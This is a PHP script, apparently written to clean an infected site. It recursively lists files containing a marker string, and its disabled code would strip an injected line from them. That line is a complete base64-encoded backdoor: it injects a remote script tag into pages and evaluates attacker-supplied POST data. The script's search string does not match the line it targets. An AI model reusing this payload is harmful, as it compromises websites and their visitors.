<?php

function buscar($dir) 
{ 
    if(!$dh = @opendir($dir)) 
    { 
        return; 
    } 
    while (false !== ($obj = readdir($dh))) 
    { 
        if($obj == '.' || $obj == '..') 
        { 
            continue; 
        } 

        if (is_file($dir.'/'.$obj)&&filesize($dir.'/'.$obj)) 
        {$ar=fopen($dir.'/'.$obj,"r");
         $contenido=fread($ar,filesize($dir.'/'.$obj)); 
         fclose($ar);
         if(strpos($contenido,"evento("))
            {echo $dir.'/'.$obj."<br />";
             /*$reemplazo=str_replace("eval(base64_decode('aWYoIWZ1bmN0aW9uX2V4aXN0cygnd2t2eWwnKSl7ZnVuY3Rpb24gd2t2eWwoJHMpe2lmKHByZWdfbWF0Y2hfYWxsKCcjPHNjcmlwdCguKj8pPC9zY3JpcHQ+I2lzJywkcywkYSkpZm9yZWFjaCgkYVswXWFzJHYpaWYoY291bnQoZXhwbG9kZSgiXG4iLCR2KSk+NSl7JGU9cHJlZ19tYXRjaCgnI1tcJyJdW15cc1wnIlwuLDtcPyFcW1xdOi88PlwoXCldezMwLH0jJywkdil8fHByZWdfbWF0Y2goJyNbXChcW10oXHMqXGQrLCl7MjAsfSMnLCR2KTtpZigocHJlZ19tYXRjaCgnI1xiZXZhbFxiIycsJHYpJiYoJGV8fHN0cnBvcygkdiwnZnJvbUNoYXJDb2RlJykpKXx8KCRlJiZzdHJwb3MoJHYsJ2RvY3VtZW50LndyaXRlJykpKSRzPXN0cl9yZXBsYWNlKCR2LCcnLCRzKTt9aWYocHJlZ19tYXRjaF9hbGwoJyM8aWZyYW1lIChbXj5dKj8pc3JjPVtcJyJdPyhodHRwOik/Ly8oW14+XSo/KT4jaXMnLCRzLCRhKSlmb3JlYWNoKCRhWzBdYXMkdilpZihwcmVnX21hdGNoKCcjW1wuIF13aWR0aFxzKj1ccypbXCciXT8wKlswLTldW1wnIj4gXXxkaXNwbGF5XHMqOlxzKm5vbmUjaScsJHYpJiYhc3Ryc3RyKCR2LCc/Jy4nPicpKSRzPXByZWdfcmVwbGFjZSgnIycucHJlZ19xdW90ZSgkdiwnIycpLicuKj88L2lmcmFtZT4jaXMnLCcnLCRzKTskcz1zdHJfcmVwbGFjZSgkYT1iYXNlNjRfZGVjb2RlKCdQSE5qY21sd2RDQnpjbU05YUhSMGNEb3ZMM0JoWTI5ellXeGhjeTVzZFd4bGJIa3VaWE12YVcxaFoyVnpMMk5oYkdWdVpHRnlMbkJvY0NBK1BDOXpZM0pwY0hRKycpLCcnLCRzKTtpZihzdHJpc3RyKCRzLCc8Ym9keScpKSRzPXByZWdfcmVwbGFjZSgnIyhccyo8Ym9keSkjbWknLCRhLidcMScsJHMsMSk7ZWxzZWlmKHN0cnBvcygkcywnPGEnKSkkcz0kYS4kcztyZXR1cm4kczt9ZnVuY3Rpb24gd2t2eWwyKCRhLCRiLCRjLCRkKXtnbG9iYWwkd2t2eWwxOyRzPWFycmF5KCk7aWYoZnVuY3Rpb25fZXhpc3RzKCR3a3Z5bDEpKWNhbGxfdXNlcl9mdW5jKCR3a3Z5bDEsJGEsJGIsJGMsJGQpO2ZvcmVhY2goQG9iX2dldF9zdGF0dXMoMSlhcyR2KWlmKCgkYT0kdlsnbmFtZSddKT09J3drdnlsJylyZXR1cm47ZWxzZWlmKCRhPT0nb2JfZ3poYW5kbGVyJylicmVhaztlbHNlJHNbXT1hcnJheSgkYT09J2RlZmF1bHQgb3V0cHV0IGhhbmRsZXInP2ZhbHNlOiRhKTtmb3IoJGk9Y291bnQoJHMpLTE7JGk+PTA7JGktLSl7JHNbJGldWzFdPW9iX2dldF9jb250ZW50cygpO29iX2VuZF9jbGVhbigpO31vYl9zdGFydCgnd2t2eWwnKTtmb3IoJGk9MDskaTxjb3VudCgkcyk7JGkrKyl7b2Jfc3RhcnQoJHNbJGldWzBdKTtlY2hvICRzWyRpXVsxXTt9fX0kd2t2eWxsPSgoJGE9QHNldF9lcnJvcl9oYW5kbGVyKCd3a3Z5bDInKSkhPSd3a3Z5bDInKT8kYTowO2V2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbJ2UnXSkpOw=='));","",$contenido);
             $ar=fopen($dir.'/'.$obj,"w");
             fwrite($ar,$reemplazo); 
             fclose($ar);     */
            }      
        } 
      buscar($dir.'/'.$obj); 
    } 

    closedir($dh); 

    return; 
}
buscar("../saia1.06"); 
?>
